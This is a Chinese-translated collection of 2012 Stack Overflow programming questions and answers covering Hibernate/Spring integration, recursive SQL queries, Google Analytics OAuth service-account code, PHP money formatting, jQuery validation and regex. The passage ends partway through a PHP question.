而 EJB 应用程序正在这样做，这是一种标准的休眠方式（即 xxx-cfg.xml 和 xxx-hbm.xml），

所以我很困惑，我的方法应该是什么？欢迎任何帮助。

* * *

对不起，我忘了提到版本-->

在 EJB Application --> EJB 2.0 and Hibernate 3.1.3 & Spring Application, Spring 3.x and Hibernate 3.2.6

在 Spring-Hibernate Application 中，它们有自己的缓存实现，目前两者都指的是单独的数据源和单独的 Db 模式。

我想集成它们，这样，两者都将具有相同的 db-schema（我将通过合并它们的模式来做到这一点，即将表等添加到当前模式）和相同的数据源（这里我们使用 JBoss 通过 xxx- 管理数据源连接ds.xml)

EJB-Hibernate Application 我们已经提到了这个数据源的 JNDI 名称，所以它指的是那个。但是在 Spring App 中，它们有各自的数据源，但我可以使用相同的 JNDI 名称使其引用相同。

请告诉我，我应该如何进行这种集成？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T06:45:58.367

您的信息似乎有点混乱，但我会尝试从您提到的内容中收集信息。

当您说要集成两个应用程序时，除了使用公共数据源之外，您是否试图在您的应用程序中摆脱 EJB 2 并改用 Spring ？这将需要从 EJB2 迁移到 Spring。为此，有很多这样的[文章](http://kaksles.org/2007/08/11/how-to-migrate-a-legacy-ejb-application-to-spring-and-hibernate/)。

或者，如果您想要的是两个应用程序应该独立存在但应该使用单一模式，那么正如您所说，您可以将两个模式合并为一个，在 JNDI 中注册数据源。然后使用可以在两个不同的应用程序中使用相同的数据源。EJB2 和 Spring 都可以使用 JNDI 绑定数据源。

如果两个应用程序独立存在并且其中一个正在使用休眠二级缓存（如您所述），那么您将必须小心，因为您的缓存将经常失效，因为您的数据库将在两个可以写入数据库的应用程序之间共享. 事实上，在这种情况下，只缓存永远不会改变的只读数据**是明智的。**

# sql - 如何在经理记录后显示经理ID，名称下属ID和姓名

> ID：12429382
> 
> 赞同：1
> 
> 时间：2012-09-14T17:39:02.047
> 
> 标签：sql, sql-server, tsql

如何在每个经理记录下显示经理 ID、经理姓名和下属详细信息。

```
EMPNO  ENAME   JOB        MGR   HIREDATE   SAL   COMM  DEPTNO 
-----  ------  ---------  ----  ---------  ----  ----  ------
7839   KING    PRESIDENT  -     17-NOV-81  5000  -     10 
7698   BLAKE   MANAGER    7839  01-MAY-81  2850  -     30 
7782   CLARK   MANAGER    7839  09-JUN-81  2450  -     10 
7566   JONES   MANAGER    7839  02-APR-81  2975  -     20 
7654   MARTIN  SALESMAN   7698  28-SEP-81  1250  1400  30 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T17:45:08.870

试试这个：

```
WITH MyCTE AS 
( 
  SELECT EMPNO, EName, Null as ManagerId, NULL as ManagerName
  FROM Employee
  WHERE ManagerID IS NULL
  UNION ALL
  SELECT  EMPNO, EName, ManagerId, MyCTE.EName
  FROM Employee
  INNER JOIN MyCTE ON Employee.ManagerID = MyCTE.EmpID
  WHERE Employee.ManagerID IS NOT NULL 
)
SELECT *
FROM MyCTE 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-14T18:01:28.607

只是要添加一种没有 CTE 的方式，您需要加入您想要的每个级别：

```
select m.empno,
  m.ename,
  m.job,
  e1.empno,
  e1.ename underling,
  e1.mgr,
  e1.ujob,
  e2.empno,
  e2.ename subunderling,
  e2.mgr,
  e2.subjob
from
(
  select empno, ename, job
  from yourtable
  where mgr is null
) m
left join
(
  select empno, ename, job ujob, mgr
  from yourtable
) e1
  on m.empno = e1.mgr
left join
(
  select empno, ename, job subjob, mgr
  from yourtable
) e2
  on e1.empno = e2.mgr 
```

# 见[SQL Fiddle with Demo](http://sqlfiddle.com/#!3/78dc3/15)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-14T17:59:25.673

这是一个难题，但它是可以解决的。首先，您必须记住，没有 ORDER BY 的 SQL 查询不能保证排序。因此，仅仅因为它恰好产生了正确的结果并不意味着查询对于您想要的内容是正确的。

挑战是在记录上添加一个排序键，以正确的顺序排列事物。这是记录的深度优先排序。挑战之一是同一经理的三名员工需要不同的密钥——因为他们之间可能会出现其他记录。

因此，有效的排序键是通过生成包含员工 ID 的顶部路径来构建的。对于您的数据，键是：

*   '7839'
*   '7839<--7698'
*   '7839<--7782'
*   '7839<--7566'
*   '7839<--7698<--7654'

这些按适当的顺序排序。创建密钥是一项挑战，需要递归 CTE。（感谢安倍提供一个。）

```
WITH MyCTE AS 
( 
  SELECT EMPNO, EName, Null as ManagerId, NULL as ManagerName,
         cast(EMPNO as varchar(8000)) as sortkey
  FROM Employee
  WHERE ManagerID IS NULL
  UNION ALL
  SELECT  EMPNO, EName, ManagerId, MyCTE.EName,
          mycte.sortkey+'<--'+cast(Employee.empno as varchar(8000))
  FROM Employee
  INNER JOIN MyCTE ON Employee.ManagerID = MyCTE.EmpID
  WHERE Employee.ManagerID IS NOT NULL 
)
SELECT EMPNO, EName, ManagerId, MyCTE.EName
FROM MyCTE
order by sortkey 
```

实际的排序键与上面的类似，但附加了“<--”。请注意，这仅在排序键正好是 4 位时才有效。如果您有不同的长度，那么您将希望用零填充它们。

# java - 在 Grails 中上传（发送）文件

> ID：12429385
> 
> 赞同：1
> 
> 时间：2012-09-14T17:39:10.990
> 
> 标签：java, grails, file-upload, upload

我尝试执行以下操作：

*   用户必须将文件上传到我的服务器
*   我的服务器将此文件发送到 openstack Swift 后端服务

我正在使用Grails，有什么想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-09T17:21:37.497

我解决了，我使用 Swift Java API：[https ://github.com/rackspace/java-cloudfiles](https://github.com/rackspace/java-cloudfiles)

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-09-14T21:55:28.197

请查看 Grails 手册 -[关于文件上传的部分](http://grails.org/doc/latest/guide/theWebLayer.html#uploadingFiles)写得非常好。

# javascript - 使用 javascript 从网站输入数据

> ID：12429386
> 
> 赞同：-2
> 
> 时间：2012-09-14T17:39:20.730
> 
> 标签：javascript

我一直在尝试找到一种方法来从一个用 HTML 编码的网站输入数据，并在上面输出一个 javascript。无论如何将页面上的任何文本（带有一行字符串的空白页面）合并到我编写的javascript程序上的字符串中？我一直在寻找很长一段时间，如果这是一个重复的问题，我很抱歉。感谢您的所有帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T17:44:44.173

说什么？我在想你想要这个，但我真的不确定你想要什么。

```
<html>
  <head>
    <script>
      var myJavaScriptString = document.body.innerHTML;

      /*  Do cool things with your one line string  */
    </script>
  </head>
  <body>
    one line string
  </body>
</html> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T13:47:03.087

如果您有 2 个单独的 html 页面，您可以使用 ajax 并从第一个 html 页面获取数据。

你在使用 jquery 库吗？这可能会使这更清洁和更容易。检查这个样本。[http://api.jquery.com/jQuery.get/](http://api.jquery.com/jQuery.get/)

# ios - 手势识别器

> ID：12429388
> 
> 赞同：0
> 
> 时间：2012-09-14T17:39:27.627
> 
> 标签：ios, uigesturerecognizer, uipangesturerecognizer, uiswipegesturerecognizer

我`UIView`在屏幕的某个部分有一个。这个 UIView 有平移手势识别器。这个 UIView (mainVw) 有一个`UITextView`完全覆盖 UIView。此 UITextview 具有滑动手势（向左和书写）。

我的问题是当我向左或向右滑动时， UIView 也开始拖动。我想要的是，当我拖动 UIView 时它应该拖动，当我滑动 UITextView 时应该向左滑动写入但不拖动。

这是我用来更好理解的代码：

```
UIPanGestureRecognizer *panGesture = [[UIPanGestureRecognizer alloc] initWithTarget:self action:@selector(handlePan:)];
    [panGesture setMinimumNumberOfTouches:1];
    panGesture.delegate =(id)self;
    [self.mainVw addGestureRecognizer:panGesture];
    //[self.mainVw.layer setValue:[NSValue valueWithCGPoint:vwCaptionBg.center] forKey:@"originalCenter"];

UISwipeGestureRecognizer *rightRecognizer;
rightRecognizer = [[UISwipeGestureRecognizer alloc] initWithTarget:self action:@selector(handlePanTouch:)];
[rightRecognizer setDirection: UISwipeGestureRecognizerDirectionRight];
rightRecognizer.delegate=(id)self;
[self.txtVw addGestureRecognizer:rightRecognizer];

UISwipeGestureRecognizer *vwLeftRecognizer;
vwLeftRecognizer = [[UISwipeGestureRecognizer alloc] initWithTarget:self action:@selector(handlePanTouch:)];
[vwLeftRecognizer setDirection: UISwipeGestureRecognizerDirectionLeft];
vwLeftRecognizer.delegate=(id)self;
[self.txtVw addGestureRecognizer:vwLeftRecognizer]; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T17:43:23.983

您可以尝试使用该`[GESTURE requireGestureRecognizerToFail:GESTURE_TO_FAIL];`方法。这将是您的滑动需要失败，然后才能允许平底锅继续进行。

还有一些委托方法可以用于同时手势。

```
- (BOOL)gestureRecognizer:(UIGestureRecognizer *)gestureRecognizer shouldRecognizeSimultaneouslyWithGestureRecognizer:(UIGestureRecognizer *)otherGestureRecognizer 
```

或者您可以将这些委托方法中的任何一个与您自己的逻辑一起使用。

```
- (BOOL)gestureRecognizer:(UIGestureRecognizer *)gestureRecognizer shouldReceiveTouch:(UITouch *)touch
- (BOOL)gestureRecognizerShouldBegin:(UIGestureRecognizer *)gestureRecognizer 
```

# xml - 使用 linux 实用程序从文件中提取正则表达式。在单独的行上打印每个匹配项

> ID：12429389
> 
> 赞同：0
> 
> 时间：2012-09-14T17:39:34.593
> 
> 标签：xml, regex, linux, sed, awk

我正在尝试使用正则表达式从文件中提取值。

我有 2 个 xml 文件。每一个都由许多具有属性`X`和`Y`, （坐标）的热点组成，例如：

```
 <HOTSPOT ID="476" NAME="19.328" MEDIATYPE="url" MEDIA="/flash/hiddenHotspot.png" X="1427" Y="1989" WIDTH="280" HEIGHT="280" ZOOM="83" XSCALE="300" YSCALE="300" URL="/archive/manuscripts/1/decode?detail=476&amp;page=0" URLTARGET="_self" ROLLOVER="0" CAPTION="328" TOOLTIP="">
    <TOOLTIP>&lt;b&gt;19.328&lt;/b&gt;.&lt;br&gt;&lt;p class="poem1"&gt;In the Year 10 House, on the Day 11 Monkey,&lt;/p&gt;</TOOLTIP>
  </HOTSPOT> 
```

我试图从文件中提取 X 值。我从 grep 开始，但它返回完整的行。我的正则表达式只是`/X="([0-9]+)"/`. 我在 ubuntu 12.04 上。我确信这些内置实用程序之一可以提供帮助，但我无法找到哪一个。

有没有办法使用 linux 实用程序将我的正则表达式的匹配项打印到标准输出？每场比赛应该在单独的一行？有人可以指出我正确的方向吗？泰。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T17:42:16.777

`grep -o`与正则表达式模式一起使用`(?<=\bX=")([^"]+)(?=")`

# .net - 通过 OAuth 2.0 自动使用 google-api-dotnet-client

> ID：12429392
> 
> 赞同：2
> 
> 时间：2012-09-14T17:39:40.930
> 
> 标签：.net, vb.net, google-analytics-api, google-api-client

我有一堆密钥：客户端 ID、客户端密码、API 密钥

但是所有文档都显示了使用人工交互的身份验证。

如何在没有用户交互的情况下使用点网库与 Google API v3 和 AnalyticsService 进行交互？如果我只使用 API 密钥，我会得到“需要 Google.Apis.Requests.RequestError 登录”

我在任何地方都找不到这样做的样本。

编辑：这是一个谷歌分析帐户，我可以完全访问它，用户名，密码，客户端 ID，客户端密码，api/开发者密钥，一切。我只想让实用程序每天在没有我的情况下下载数据。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-26T13:52:42.250

这是我的工作代码，这是我通过批处理文件进程调用的控制台应用程序。我不是 .Net 开发人员，所以这段代码可能并不完美，如果您看到任何需要改进的地方，请告诉我！错误处理是最小的，因为我不希望一次失败杀死批次

我正在使用注册表来存储访问令牌和过期时间在应用程序文件夹中还有 privatekey.p12 文件该帐户是用户而不是配置文件上的管理员。

还张贴在这里[https://groups.google.com/forum/?fromgroups=#!topic/google-analytics-data-export-api/quIN0vX-psw](https://groups.google.com/forum/?fromgroups=#!topic/google-analytics-data-export-api/quIN0vX-psw)

命令行调用示例：C:\DW\GoogleAnalyticsNicheSites\GoogleAnalyticsNicheSites.exe "ga:XXXX9049" "2012-04-01" "2012-04-01" "ga:visitors,ga:newVisits,ga:visits,ga:bounces ,ga:pageviews" "ga:date,ga:medium" "XXXXXXXXXXXXXXXXXXXXXXXXXXXX-privatekey.p12" "XXXXX...@developer.gserviceaccount.com" "RegKey" > C:\Data\NicheSites\ga_58589049_moneyjobs.com_20120401.txt"

```
using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using DotNetOpenAuth.OAuth2;
using Google.Apis.Analytics.v3;
using Google.Apis.Analytics.v3.Data;
using Google.Apis.Authentication.OAuth2.DotNetOpenAuth;
using Microsoft.Win32;
using Newtonsoft.Json;

namespace ConsoleApplication5
{
    class Program
    {
        public static string access_token = "";
        public static string expire_time = string.Empty;
        public static string profileId = string.Empty;
        public static string metrics = string.Empty;
        public static string dimensions = string.Empty;
        public static string startDate = string.Empty;
        public static string endDate = string.Empty;
        public static string privatekeyFile = string.Empty;
        public static string loginEmail = string.Empty;
        public static string regKeyName = string.Empty;

        static void Main(string[] args)
        {

            profileId = args[0];
            startDate = args[1];
            endDate = args[2];
            metrics = args[3];
            dimensions = args[4];
            privatekeyFile = args[5];
            loginEmail = args[6];
            regKeyName = args[7];

            try
            {
                // certificate
                string path = System.Reflection.Assembly.GetExecutingAssembly().CodeBase;
                var directory = System.IO.Path.GetDirectoryName(path).Remove(0, 6);
                var certificate = new X509Certificate2(directory + "\\" + privatekeyFile , "notasecret");

                try
                {
                    expire_time = (string)Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Wow6432Node\CB\" + regKeyName).GetValue("ExpireTime").ToString();
                }
                catch (Exception e)
                {
                    RegistryKey key;
                    key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\CB\" + regKeyName);
                    key.SetValue("OAuthToken", "");
                    key.Close();
                }

                try
                {
                    access_token = (string)Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Wow6432Node\CB\" + regKeyName).GetValue("OAuthToken").ToString();
                }
                catch (Exception e)
                {
                    RegistryKey key;
                    key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\CB\" + regKeyName);
                    key.SetValue("ExpireTime", DateTime.UtcNow.AddSeconds(3500).ToString("MM/dd/yyyy HH:mm:ss"));
                    key.Close();
                }

                if (expire_time == null || expire_time.Length < 4)
                {
                    expire_time = "01/01/2000";
                }

                var ExpireDateTime = Convert.ToDateTime(expire_time);
                var ExpireTimeNow = DateTime.UtcNow;
                TimeSpan span = ExpireDateTime - ExpireTimeNow;
                double iExpireLeft = span.TotalSeconds;

                if (iExpireLeft < 60)
                {

                    // header
                    var header = new { typ = "JWT", alg = "RS256" };

                    // claimset
                    var times = GetExpiryAndIssueDate();
                    var claimset = new
                    {
                        iss = loginEmail,
                        scope = "https://www.googleapis.com/auth/analytics.readonly",
                        aud = "https://accounts.google.com/o/oauth2/token",
                        iat = times[0],
                        exp = times[1],
                    };

                    // encoded header
                    var headerSerialized = JsonConvert.SerializeObject(header);
                    var headerBytes = Encoding.UTF8.GetBytes(headerSerialized);
                    var headerEncoded = Base64UrlEncode(headerBytes);

                    // encoded claimset
                    var claimsetSerialized = JsonConvert.SerializeObject(claimset);
                    var claimsetBytes = Encoding.UTF8.GetBytes(claimsetSerialized);
                    var claimsetEncoded = Base64UrlEncode(claimsetBytes);

                    // input
                    var input = headerEncoded + "." + claimsetEncoded;
                    var inputBytes = Encoding.UTF8.GetBytes(input);

                    // signiture
                    var rsa = certificate.PrivateKey as RSACryptoServiceProvider;
                    var cspParam = new CspParameters
                    {
                        KeyContainerName = rsa.CspKeyContainerInfo.KeyContainerName,
                        KeyNumber = rsa.CspKeyContainerInfo.KeyNumber == KeyNumber.Exchange ? 1 : 2
                    };
                    var aescsp = new RSACryptoServiceProvider(cspParam) { PersistKeyInCsp = false };
                    var signatureBytes = aescsp.SignData(inputBytes, "SHA256");
                    var signatureEncoded = Base64UrlEncode(signatureBytes);

                    // jwt
                    var jwt = headerEncoded + "." + claimsetEncoded + "." + signatureEncoded;

                    var client = new HttpClient();
                    var uri = "https://accounts.google.com/o/oauth2/token";
                    var post = new Dictionary<string, string>
                {
                    {"assertion", jwt},
                    {"grant_type", "urn:ietf:params:oauth:grant-type:jwt-bearer"}
                };
                    var content = new FormUrlEncodedContent(post);
                    var result = client.PostAsync(uri, content).Result;

                    RootObject values = JsonConvert.DeserializeObject<RootObject>(result.Content.ReadAsStringAsync().Result);
                    access_token = values.access_token;

                    RegistryKey key;
                    key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\CB\" + regKeyName);
                    key.SetValue("OAuthToken", access_token);
                    key.Close();

                    key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\CB\" + regKeyName);
                    key.SetValue("ExpireTime", DateTime.UtcNow.AddSeconds(3500).ToString("MM/dd/yyyy HH:mm:ss"));
                    key.Close();
                }

                // Create the service.
                var service = new AnalyticsService();
                ListAnalytics(service);
            }
            catch (Exception e)
            {
                Console.WriteLine(profileId + ": " + e.Message + " " + e.Source + " " + e.StackTrace);
            }
        }

        private static IAuthorizationState GetAuthorization(NativeApplicationClient arg)
        {
            IAuthorizationState state = new AuthorizationState(new[] { "https://www.googleapis.com/auth/analytics.readonly" });
            state.Callback = new Uri(NativeApplicationClient.OutOfBandCallbackUrl);
            state.AccessToken = access_token;
            string authCode = access_token;
            arg.RefreshToken(state); 
            return state;
        }

        private static void ListAnalytics(AnalyticsService service)
        {
            try
            {
                var iCount = 1;
                var iStartIndex = 1;

                while (iCount > 0 )
                {
                    var response = service.Data.Ga.Get(profileId, startDate, endDate, metrics);
                    response.Dimensions = dimensions;
                    response.MaxResults = 10000;
                    response.StartIndex = iStartIndex;
                    response.Oauth_token = access_token;
                    GaData report = response.Fetch();

                    Console.Write("ids|");

                    for (int i = 0; i <= report.ColumnHeaders.Count - 2; i++)
                    {
                        Console.Write(report.ColumnHeaders[i].Name.ToString() + "|");
                    }

                    Console.WriteLine(report.ColumnHeaders[report.ColumnHeaders.Count - 1].Name.ToString());

                    if (null != report.Rows.Count)
                    {
                        for (int i = 0; i < report.Rows.Count; i++)
                        {

                            IList<string> row = report.Rows[i];
                            Console.Write(profileId + "|");

                            for (int x = 0; x <= row.Count - 2; x++)
                            {
                                Console.Write(row[x].ToString() + "|");
                            }
                            Console.WriteLine(row[row.Count - 1].ToString());
                        }
                        //Console.ReadLine();
                        iCount = report.Rows.Count < 10000 ? 0 : 1;
                    }
                    else 
                    { 
                        iCount = 0;
                    }
                    iStartIndex += 10000;
                }
            }
            catch (Exception ex)
            {

            }
        }

                                    private static int[] GetExpiryAndIssueDate()
    {
        var utc0 = new DateTime(1970, 1, 1, 0, 0, 0, 0, DateTimeKind.Utc);
        var issueTime = DateTime.UtcNow;

        var iat = (int)issueTime.Subtract(utc0).TotalSeconds;
        var exp = (int)issueTime.AddMinutes(55).Subtract(utc0).TotalSeconds;

        return new[] { iat, exp };
    }

                                    private static string Base64UrlEncode(byte[] input)
    {
        var output = Convert.ToBase64String(input);
        output = output.Split('=')[0]; // Remove any trailing '='s
        output = output.Replace('+', '-'); // 62nd char of encoding
        output = output.Replace('/', '_'); // 63rd char of encoding
        return output;
    }

                            public class RootObject
    {
        public string access_token { get; set; }
        public string token_type { get; set; }
        public int expires_in { get; set; }
    }

        //public static Google.Apis.Authentication.IAuthenticator UseSavedAuthorization()
        //{

        //    var provider = new NativeApplicationClient(GoogleAuthenticationServer.Description);
        //    provider.ClientIdentifier = "XXXXXXXXXXXXXXXXX-6ogef1100hmt92k8frqaprhfr38b4oaq.apps.googleusercontent.com";
        //    provider.ClientSecret = "XXXXXXXXXXXXXXXXXXXXXX";

        //    AuthenticatorFactory.GetInstance().RegisterAuthenticator(() => new OAuth2Authenticator(provider, GetAuthentication));

        //    OAuth2Authenticator<NativeApplicationClient> auth = new OAuth2Authenticator<NativeApplicationClient>(provider, getState);

        //    auth.LoadAccessToken();

        //    return auth;
        //}

        //public static IAuthorizationState getState(NativeApplicationClient arg)
        //{
        //    IAuthorizationState state = new AuthorizationState(new[] { AnalyticsService.Scopes.AnalyticsReadonly.ToString() });
        //    state.Callback = new Uri(NativeApplicationClient.OutOfBandCallbackUrl);

        //    state.RefreshToken = access_token;        
        //    arg.RefreshToken(state); 

        //    return state; 
        //}

    }
} 
```

# php - money_format - 负数

> ID：12429397
> 
> 赞同：2
> 
> 时间：2012-09-14T17:39:52.333
> 
> 标签：php, money-format

我得到以下代码

```
#   On va convertir en somme monétaire
#   We convert our integer into a way to read money
$Vars['Income']     = money_format('%.2n', $Income);
$Vars['Spending']   = money_format('%.2n', $Spending);

#   On va calculer ce qui reste à dépenser
#   We do the math to know how much we can spend until the end of the month
$Vars['Remaining']  = money_format('%.2n', $Income - $Spending); 
```

如果`$Income - $Spending`为负数（低于 0），则收入低于支出。好吧。我正在使用我的语言环境法语（加拿大），负数的结果是（X，XX $）。

没有 - 符号对我来说没有意义，所以我希望能够输出带有 -0.00$ 而不是 (0.00$) 的数字。

例如，我的收入是 75.00 美元，而我的支出是 100.00 美元。我多花了 25 美元，所以剩余的钱将输出（25.00 美元），但我想要 -25.00 美元。

我确实尝试添加 ( 或 + 但我不明白。

谢谢

更新：[图片](https://i.stack.imgur.com/m9dJ8.jpg)

![在此处输入图像描述](../Images/d95c6b0841afecd83cf459831ff3284d.png)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-14T17:44:26.320

的格式字符串[`money_format`](http://php.net/manual/en/function.money-format.php)有点混乱。你想要的是：

```
money_format('%+.2n', $Income - $Spending); 
```

# jquery - 使用 jQuery.Validate - 需要根据单选按钮选择验证特定的字段组（字段不隐藏）

> ID：12429399
> 
> 赞同：1
> 
> 时间：2012-09-14T17:39:56.340
> 
> 标签：jquery, validation

我正在使用 jQuery.Validate 来验证和提交我的表单。

在此特定页面上，用户可以选择输入信用卡信息（6 个字段）或输入采购订单编号（1 个字段）。

选择是通过单选按钮进行的​​。

```
<table cellpadding="0" cellspacing="0" align="center" bgcolor="#FFFFFF" width="100%">
  <tbody>
    <tr>
      <td rowspan="5" width="280" valign="top"><br /></td>
      <td width="440" colspan="2"><br />
        <strong>name</strong> (as it appears on card) *<br />
        <input type="text" name="cardName" maxlen="100" onchange="selectRadio(0)" value="" /></td>
    </tr>
    <tr>
      <td colspan="2" width="440"><strong>card type</strong> *<br />
        <select name="cardType" onchange="selectRadio(0)">
          <option value="MasterCard">MasterCard</option>
          <option value="VisaCard">Visa</option>
          <option value="AmExCard">American Express</option>
        </select></td>
    </tr>
    <tr>
      <td width="440" colspan="2"><strong>card number</strong> (no spaces) *<br />
        <input type="text" name="cardNumber" maxlen="25" onchange="selectRadio(0)" value="" /></td>
    </tr>
    <tr>
      <td width="440" colspan="2"><strong>card identification number</strong> (on back of credit card)<br />
        <input type="text" name="cardId" maxlen="6" onchange="selectRadio(0)" value="" /></td>
    </tr>
    <tr>
      <td colspan="2" width="440"><strong>expiration date</strong> *<br />
        <select name="ExpMon" onchange="selectRadio(0)">
          <option value="">&lt;month&gt;</option>
          <option value="1">01</option>
          <option value="2">02</option>
          <option value="3">03</option>
          <option value="4">04</option>
          <option value="5">05</option>
          <option value="6">06</option>
          <option value="7">07</option>
          <option value="8">08</option>
          <option value="9">09</option>
          <option value="10">10</option>
          <option value="11">11</option>
          <option value="12">12</option>
        </select>

        <select name="ExpYear">
          <option value="" onchange="selectRadio(0)">&lt;year&gt;</option>
          <option value="2012">2012</option>
          <option value="2013">2013</option>
          <option value="2014">2014</option>
          <option value="2015">2015</option>
          <option value="2016">2016</option>
        </select></td>
    </tr>
    <tr>
      <td width="280"> </td>
      <td colspan="2" width="440"><br /></td>
    </tr>
    <tr>
      <td><input type="radio" name="paymentMode" value="purchaseOrder" />
        pay using a purchase order number<br /></td>
      <td valign="top"><br />
        <br />
        <br />
        <strong>purchase order number</strong> *<br />
        <input type="text" name="PONumber" maxlen="40" onchange="selectRadio(1)" /></td>
    </tr>
  </tbody>
</table> 
```

我的验证代码如下所示：

```
<script type="text/javascript">
    $(document).ready(function(){
        $("#frmRegistration2").validate({
            debug: false,
            rules: {

            },
            messages: {

            },
            submitHandler: function(form) {
                // do other stuff for a valid form
                $.post(\'/beta4/_action.php\', $("#frmRegistration2").serialize(), function(data) {
                        $(\'.pane2\').slideUp(\'slow\');
                        $(\'#result2\').html(data);
                        $(\'.pane3\').slideDown(\'slow\');

                });
            }
        });
    });
    </script>'; 
```

有人建议使用依赖规则，但是我不知道如何使用它.. 给出的示例只是检查我是否选中了单选按钮。问题是我有 2 个单选按钮，而不仅仅是一个。所以它必须取决于单选按钮的价值。有人可以告诉我如何做到这一点吗？

这是示例代码：

```
$("#myForm").validate({
   rules: {
      contact: {
         required: {
            depends: function(element) {
               return $("#myCheckbox:checked");
            }
         }
      }
   }
}) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T12:18:55.060

经过进一步研究，这似乎在规则中起作用：

```
rules: {
PONumber: {
    required: {
        depends: function(element) 
                  {
                  return $("[name=paymentMode]:checked").val() == "purchaseOrder";
                  }             
               }
           }            
       } 
```

对我来说困难的部分是所有其他示例都忽略了单选按钮应该用作选择器的事实。即，有多个单选按钮具有相同的名称，但具有不同的值。使用此方法，您可以根据选中的单选按钮的值设置您的依赖。对我有用，它应该对你有用。

# objective-c - 字母、数字、无空格的正则表达式

> ID：12429401
> 
> 赞同：1
> 
> 时间：2012-09-14T17:40:12.833
> 
> 标签：objective-c, regex

我正在尝试创建一个正则表达式来检查 6-12 个字符，一个是数字，其余的是任何字符，没有空格。正则表达式可以做到这一点吗？我正在尝试在objective-c中执行此操作，但我根本不熟悉Regex。我一直在阅读一些教程，但大多数都是为了匹配一个数字或一组数字的简单案例，但并不完全是我想要的。我可以用方法做到这一点，但我想知道这是否会太慢，我想我可以尝试学习一些新东西。

```
asdfg1 == ok
asdfg 1 != ok
asdfgh != ok
123456 != ok
asdfasgdasgdasdfasdf != ok 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T17:42:21.447

使用这个正则表达式`^(?=.*\d)(?=.*[a-zA-Z])[^ ]{6,12}$`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T19:10:52.477

这是一个数字： `^[^\d\x20]{0,11}\d{1}[^\d\x20]{0,11}$`但我不能限制为 6-12 的长度，您可以使用其他功能先检查长度，如果它从 6 到 12 用我写的这个正则表达式女巫检查。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-14T17:50:18.273

我没有尝试，但我认为这是答案

```
(^[^\d\x20]*\d[^\d\x20]*$){6,12} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-14T18:00:30.607

当您说“字符”时，您的意思似乎是“字母”，对吧？而且（感谢burning_LEGION指出）可能只有一位数？

在这种情况下，使用

```
^(?=\D*\d\D*$)[^\W_]{6,12}$ 
```

**解释：**

```
^             # Start of string
(?=\D*\d\D*$) # Assert that there is exactly one digit in the string
[^\W_]        # Match a letter or digit (explanation below)
{6,12}        # 6-12 times
$             # End of string 
```

`[^\W_]`可能看起来有点奇怪。它是如何工作的？好吧，`\w`匹配任何字母、数字或下划线。`\W`匹配任何`\w`不匹配的东西。所以`[^\W]`（意思是“匹配任何不是字母数字/下划线的字符”）本质上与 相同`\w`，但是通过添加`_`到这个字符类，我们可以从允许的字符列表中删除下划线。

# function - 在 Matlab 用户函数中调用大小会导致错误

> ID：12429408
> 
> 赞同：2
> 
> 时间：2012-09-14T17:40:49.543
> 
> 标签：function, matlab

对于那里的 Matlab 用户来说，这应该是一个简单的问题。

参数 y 是 1 x 81 矩阵（一个数组）。我的功能如下所示：

```
function [  ] = test( y )

length(y)

end 
```

然而，当调用 test 时，我收到以下错误：“??? 尝试引用非结构数组的字段。”
我做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T17:45:45.497

你需要指定一个返回参数！

```
function [size] = test (y ) etc... 
```

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-09-14T17:51:24.983

`test`已经是内置功能了。

```
>> help test
 --- help for classregtree/test ---

 test Compute error rate for tree.
 COST = test(T,'resubstitution') computes the cost of the tree T 
```

`T`决策树在哪里。

# php - jquery 函数我相信是搞砸了 php 函数

> ID：12429414
> 
> 赞同：-1
> 
> 时间：2012-09-14T17:41:12.383
> 
> 标签：php, jquery

> **可能重复：**
> [如何显示正确的页码？](https://stackoverflow.com/questions/11526949/how-to-display-the-correct-page-number)

我在下面有一段代码，它确定用户正在进行的评估以及用户当前正在进行的评估编号：

```
<h1>CREATING QUESTIONS AND ANSWERS: ASSESSMENT <?php echo $sessionMinus ?> OF <?php echo $_SESSION['initial_count'] ?></h1> 
```

因此，在浏览器上，这可以读取例如：

```
CREATING QUESTIONS AND ANSWERS: ASSESSMENT 1 OF 4 
```

现在下面我有一个提交按钮：

```
<input id="addQuestionBtn" name="addQuestion" type="button" value="Add Question" onClick="insertQuestion(this.form)" /> 
```

现在，如果用户单击该按钮，它将显示一个确认框，如果用户单击“确定”进行确认，那么它将提交页面，假设发生的情况是它会在评估中添加一个数字以表明用户正在进行下一次评估。

例如：

如果页面上这样说：

```
CREATING QUESTIONS AND ANSWERS: ASSESSMENT 1 OF 4 
```

如果用户提交页面并确认，那么它现在应该这样说：

```
CREATING QUESTIONS AND ANSWERS: ASSESSMENT 2 OF 4 
```

这是因为用户现在正在进行下一次评估。

但问题是当用户提交页面时它根本没有添加数字。它只是停留在'1'并且不加起来。因此，不是执行上述操作，而是执行以下操作：

如果页面上这样说：

```
CREATING QUESTIONS AND ANSWERS: ASSESSMENT 1 OF 4 
```

如果用户提交页面并确认，那么它仍然会说：

```
